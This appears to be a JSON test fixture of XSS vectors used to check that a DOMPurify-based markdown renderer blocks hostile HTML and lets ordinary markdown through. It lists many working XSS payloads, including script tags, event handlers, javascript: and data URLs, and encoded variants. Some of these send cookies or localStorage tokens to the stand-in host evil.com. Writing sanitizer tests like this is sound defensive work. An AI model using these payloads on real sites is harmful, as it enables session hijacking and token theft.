{
  "description": "XSS test vectors for DOMPurify sanitization verification",
  "note": "javascript: URLs are intentional test vectors, not executed code",
  "cases": [
    ["script tag", "# Hello\n<script>alert(\"XSS\")</script>", "block", "<script", "alert("],
    ["encoded script", "<script>document.location=\"http://evil.com\"</script>", "block", "<script", "document.location"],
    ["img onerror", "<img src=\"x\" onerror=\"alert(1)\">", "block", "onerror"],
    ["img onload", "<img src=\"x.jpg\" onload=\"alert(1)\">", "block", "onload="],
    ["svg onload", "<svg onload=\"alert(1)\"><circle/></svg>", "block", "onload"],
    ["body onload", "<body onload=\"alert(1)\">", "block", "<body", "onload"],
    ["div onclick", "<div onclick=\"alert(1)\">x</div>", "block", "onclick"],
    ["anchor onmouseover", "<a onmouseover=\"alert(1)\">x</a>", "block", "onmouseover"],
    ["input onfocus", "<input onfocus=\"alert(1)\" autofocus>", "block", "onfocus"],
    ["marquee onstart", "<marquee onstart=\"alert(1)\">x</marquee>", "block", "onstart"],
    ["svg animate onbegin", "<svg><animate onbegin=\"alert(1)\"/></svg>", "block", "onbegin"],
    ["svg foreignObject", "<svg><foreignObject><body onload=\"x\"/></foreignObject></svg>", "block", "onload"],
    ["js url anchor", "[x](javascript:void(0))", "block", "javascript:"],
    ["js url img", "<img src=\"javascript:void(0)\">", "block", "javascript:"],
    ["js url form", "<form action=\"javascript:void(0)\"></form>", "block", "javascript:"],
    ["js url meta", "<meta http-equiv=\"refresh\" content=\"0;url=javascript:0\">", "block", "<meta", "javascript:"],
    ["js url base", "<base href=\"javascript:0//\">", "block", "<base"],
    ["js url table bg", "<table background=\"javascript:0\"><tr><td/></tr></table>", "block", "javascript:"],
    ["js url video", "<video poster=\"javascript:0\"></video>", "block", "javascript:"],
    ["js url math", "<math xlink:href=\"javascript:0\">x</math>", "block", "javascript:", "xlink:href"],
    ["data url", "<a href=\"data:text/html,<script>x</script>\">x</a>", "block", "data:text/html"],
    ["iframe", "<iframe src=\"about:blank\"></iframe>", "block", "<iframe"],
    ["iframe srcdoc", "<iframe srcdoc=\"<script>x</script>\"></iframe>", "block", "<iframe", "srcdoc"],
    ["object", "<object data=\"about:blank\"></object>", "block", "<object"],
    ["embed", "<embed src=\"about:blank\">", "block", "<embed"],
    ["link", "<link href=\"http://evil.com/x.css\">", "block", "<link"],
    ["svg script", "<svg><script>alert(1)</script></svg>", "block", "<script"],
    ["style tag", "<style>@import 'http://evil.com/x.css';</style>", "block", "<style"],
    ["template tag", "<template><script>alert(1)</script></template>", "block", "<script"],
    ["noscript tag", "<noscript><img src=x onerror=alert(1)></noscript>", "block", "<noscript"],
    ["details ontoggle", "<details open ontoggle=alert(1)><summary>X</summary></details>", "block", "ontoggle"],
    ["isindex prompt", "<isindex action=javascript:alert(1) prompt=x>", "block", "javascript:"],
    ["keygen autofocus onfocus", "<keygen autofocus onfocus=alert(1)>", "block", "onfocus"],
    ["select autofocus onfocus", "<select autofocus onfocus=alert(1)></select>", "block", "onfocus"],
    ["textarea autofocus onfocus", "<textarea autofocus onfocus=alert(1)></textarea>", "block", "onfocus"],
    ["button formaction", "<button formaction=javascript:alert(1)>X</button>", "block", "javascript:"],
    ["input formaction", "<input type=submit formaction=javascript:alert(1)>", "block", "javascript:"],
    ["form action js", "<form><button formaction=javascript:alert(1)>X</button></form>", "block", "javascript:"],
    ["svg use xlink", "<svg><use xlink:href=\"data:image/svg+xml,<svg onload=alert(1)>\"/></svg>", "block", "onload"],
    ["math href", "<math href=\"javascript:alert(1)\">X</math>", "block", "javascript:"],
    ["img dynsrc", "<img dynsrc=\"javascript:alert(1)\">", "block", "javascript:"],
    ["img lowsrc", "<img lowsrc=\"javascript:alert(1)\">", "block", "javascript:"],
    ["bgsound", "<bgsound src=\"javascript:alert(1)\">", "block", "<bgsound"],
    ["layer", "<layer src=\"http://evil.com\"></layer>", "block", "<layer"],
    ["xml", "<?xml version=\"1.0\"?><x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>", "block", "<x:script"],
    ["xss via encoding", "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", "block", "javascript"],
    ["xss via unicode", "<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">X</a>", "block", "javascript"],
    ["xss via base64 data", "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">X</a>", "block", "data:text/html"],
    ["cookie theft attempt", "<img src=x onerror=\"new Image().src='http://evil.com/?c='+document.cookie\">", "block", "onerror"],
    ["dom manipulation", "<img src=x onerror=\"document.body.innerHTML='<h1>Hacked</h1>'\">", "block", "onerror"],
    ["localstorage theft", "<img src=x onerror=\"fetch('http://evil.com/?d='+localStorage.getItem('token'))\">", "block", "onerror"],
    ["paragraph", "This is a paragraph.", "allow", "<p>this is a paragraph.</p>"],
    ["heading", "# My Heading", "allow", "<h1"],
    ["link", "[Link](https://example.com)", "allow", "href=\"https://example.com\""],
    ["image", "![Alt](https://example.com/x.png)", "allow", "src=\"https://example.com/x.png\""],
    ["bold", "**bold**", "allow", "<strong>bold</strong>"],
    ["italic", "*italic*", "allow", "<em>italic</em>"],
    ["code", "`snippet`", "allow", "<code>snippet</code>"],
    ["blockquote", "> Quote", "allow", "<blockquote>"],
    ["ul", "- Item", "allow", "<ul>"],
    ["ol", "1. First", "allow", "<ol>"],
    ["hr", "---", "allow", "<hr"],
    ["table", "| H |\n|---|\n| C |", "allow", "<table>"],
    ["code block", "```js\nx\n```", "allow", "class=\"hljs"],
    ["mailto", "[Email](mailto:x@y.com)", "allow", "href=\"mailto:x@y.com\""]
  ]
}
